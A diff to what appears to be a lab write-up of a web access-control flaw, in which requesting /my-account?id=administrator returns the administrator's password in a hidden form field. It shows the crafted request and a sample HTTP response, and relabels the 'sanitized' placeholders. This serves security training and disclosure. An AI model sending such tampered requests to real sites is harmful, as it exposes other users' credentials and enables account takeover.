@@ -15,8 +15,8 @@ privileged user (e.g., `administrator`), the application leaks that user's curre
    - `GET /my-account?id=administrator`
 3. View the response in Burp and observe that the page contains the administrator's password value.
 
-## Evidence (sanitized)
-Request (sanitized):
+## Evidence
+Request:
 - `GET https://<lab-host>/my-account?id=administrator`
 
 Screenshot (Burp HTTP history):
@@ -24,15 +24,15 @@ Screenshot (Burp HTTP history):
 
 ![Burp HTTP history showing /my-account?id=administrator request](assets/password-disclosure-burp-history.webp)
 
-Response (sanitized snippet):
+Response snippet:
 ```http
 HTTP/2 200 OK
 Content-Type: text/html; charset=utf-8
 
 <p>Your username is: administrator</p>
 ...
-<input required type="hidden" name="csrf" value="<redacted>">
-<input required type=password name=password value='<redacted-password>'/>
+<input required type="hidden" name="csrf" value="<csrf>">
+<input required type=password name=password value='<password>'/>
 ```
 
 ## Impact
